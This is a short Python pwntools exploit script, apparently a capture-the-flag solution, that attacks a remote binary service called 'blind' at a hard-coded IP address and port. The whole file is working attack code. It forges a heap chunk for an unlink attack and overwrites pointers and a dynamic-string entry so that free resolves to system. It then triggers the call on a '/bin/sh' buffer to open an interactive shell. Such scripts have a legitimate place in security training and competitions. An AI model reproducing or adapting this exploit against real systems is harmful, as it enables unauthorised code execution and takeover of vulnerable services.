from pwn import *
from time import sleep
from roputils import ROP

# context.log_level = "debug"
# p = process("./blind")

p = remote("118.89.111.179", 12332)
elf = ELF("./blind")
rop = ROP("./blind")
def add(index , content):
	sleep(0.1)
	p.sendline("1")
	sleep(0.1)
	p.sendline(str(index))
	sleep(0.1)
	if len(content) != 0x100:
		p.sendline(content)
	else:
		p.send(content)

def delete(index):
	sleep(0.1)
	p.sendline("2")
	sleep(0.1)
	p.sendlineafter("index:" , str(index))

def edit(index , content):
	sleep(0.1)
	p.sendline("3")
	sleep(0.1)
	p.sendline(str(index))
	sleep(0.1)
	if len(content) != 0x100:
		p.sendline(content)
	else:
		p.send(content)

add(0 , "a")
add(1 , "b")
add(2 , "c")
add(3 , "d") 
add(4 , "f") # ptr[3]
add(5 , "g")
p.recv() # fflush
# unlink_fake_chunk
ptr = 0x6012C0
content = p64(0) + p64(0x81) + p64(ptr) + p64(ptr + 0x8)
content = content.ljust(0x80 , "a") + p64(0x80) + p64(0x90)
edit(3 , content)
# go
delete(4)
# step2

bss = rop.section(".bss") + 0x400
dynstr_entry = 0x6010a0
payload = "/bin/sh\x00" + p64(ptr) + p64(elf.got["free"]) + p64(dynstr_entry) + p64(ptr + 0x400)
edit(3 , payload)
# log.info("dynstr : " + hex(rop.section(".dynstr")) )

edit(3 , p64(ptr + 0x400)[:7])
edit(4 , "a" * 120 + "\x00" + "system\x00")
edit(2 , p64(0x4006d6)[:-1])
delete(1)
p.interactive()
